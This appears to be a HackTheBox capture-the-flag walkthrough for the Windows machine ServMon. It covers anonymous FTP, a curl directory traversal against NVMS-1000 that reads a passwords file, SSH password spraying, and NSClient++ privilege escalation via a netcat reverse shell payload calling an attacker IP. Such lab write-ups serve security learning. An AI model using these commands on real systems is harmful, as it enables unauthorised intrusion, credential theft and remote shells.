# ServMon — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Easy
**OS:** Windows

---

## TL;DR

Anonymous FTP access reveals notes about a configuration application (`NVMS-1000`) and the location of a passwords file on a user's desktop (`Nathan`) → Exploiting a Directory Traversal vulnerability (CVE-2019-16278) in NVMS-1000 allows reading the `Passwords.txt` file → Password spraying yields SSH access for `nadine` → Enumerating local software reveals `NSClient++` is installed → Extracting the administrator password for NSClient++ from its configuration file allows executing a known Privilege Escalation exploit to gain a `SYSTEM` reverse shell.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=9018 10.10.10.184
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | Microsoft ftpd (Anonymous Login Allowed) |
| 22 | SSH | OpenSSH for_Windows_8.0 |
| 80 | HTTP | (NVMS-1000) |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | microsoft-ds |
| 5666 | tcpwrapped| nrpe (NSClient++) |
| 6063 | tcpwrapped| |
| 6699 | napster? | |
| 8443 | HTTPS | NSClient++ |

The host is a Windows machine running an unusual mix of services, including SSH, FTP, a web server on port 80, and `NSClient++` on ports 5666 and 8443.

---

## Exploitation — FTP Enumeration & NVMS-1000 Traversal

We connect to the FTP server using anonymous credentials (`anonymous : [blank]`).
Navigating the FTP shares, we find two interesting text files left by administrators in the `Users/Nadine` and `Users/Nathan` directories (or similar shared folders):

**Confidential.txt:**
```text
Nathan,
I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.
Regards, Nadine
```

**Notes to do.txt:**
```text
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

These notes confirm two target users (`Nathan` and `Nadine`), indicate that a password file is sitting on Nathan's Desktop, and highlight that `NVMS-1000` is running on the web server (Port 80).

Researching `NVMS-1000`, we find it is vulnerable to a simple, unauthenticated Directory Traversal (Exploit-DB 47774). Because the web server runs with sufficient privileges, we can use this traversal to read `Nathan`'s `Passwords.txt` file.

We exploit the traversal using `curl`:

```bash
curl --path-as-is http://10.10.10.184/Pages/login.htm/../../../../../../../../../../../../../../../../users/Nathan/desktop/Passwords.txt
```

The server responds with the contents of the file:

```text
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$ 
```

We create a text file containing these passwords. Using `crackmapexec` or `hydra`, we password spray the two known users (`nathan`, `nadine`) against the SSH service on Port 22.

We get a successful hit: `nadine : L1k3B1gBut7s@W0rk`.

We authenticate via SSH:
```bash
ssh nadine@10.10.10.184
```

We have user access.

---

## Privilege Escalation — NSClient++ Abuse

Once on the system, we check `C:\Program Files` and confirm the presence of `NSClient++`. 

NSClient++ is a monitoring agent. The Nmap scan showed its administrative web interface is running on port 8443. We read its configuration file located at `C:\Program Files\NSClient++\nsclient.ini`.

Inside the file, we find the administrative password for the NSClient++ web portal:
`ew2x6SsGTxjRwXOT`

We know from Exploit-DB (e.g., Exploit 46802) that NSClient++ versions up to 0.5.2.35 are vulnerable to Privilege Escalation. If a user possesses the administrative password for the web portal, they can upload malicious scripts and configure the agent to execute them. Because the NSClient++ service runs as `NT AUTHORITY\SYSTEM`, the executed scripts run as `SYSTEM`.

We can forward port 8443 to our attacking machine to interact with the GUI, or we can use an automated exploit script.

Using the `NSClient-0.5.2.35-Privilege-Escalation` script (by `xtizi` on GitHub):
`https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation`

We generate a Netcat reverse shell payload (e.g., `nc.exe 10.10.14.32 4444 -e cmd.exe` formatted for the exploit) and run the exploit against `localhost:8443` (or via our port forward), providing the `ew2x6SsGTxjRwXOT` password.

The script logs into the NSClient++ API, creates a new external script command pointing to our payload, and executes it.

Our Netcat listener catches the incoming shell.

We are `NT AUTHORITY\SYSTEM`. **Root.** 🎉

---

## Key Takeaways

- **Careless File Placements:** Administrators leaving "Passwords.txt" on their Desktop, combined with informative notes explaining exactly where the sensitive files are located, is a classic entry vector.
- **Directory Traversal in IoT/Management Apps:** Applications like NVMS (Network Video Management System) frequently suffer from basic directory traversal vulnerabilities due to poor input validation on URL paths.
- **Agent Privilege Escalation:** Monitoring agents (NSClient++, PRTG, Zabbix, Nagios DP) run as `SYSTEM` or `root` to gather metrics. If they have internal web portals or command interfaces that can be accessed via leaked credentials, they can be weaponized to execute arbitrary code at the highest privilege level.

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*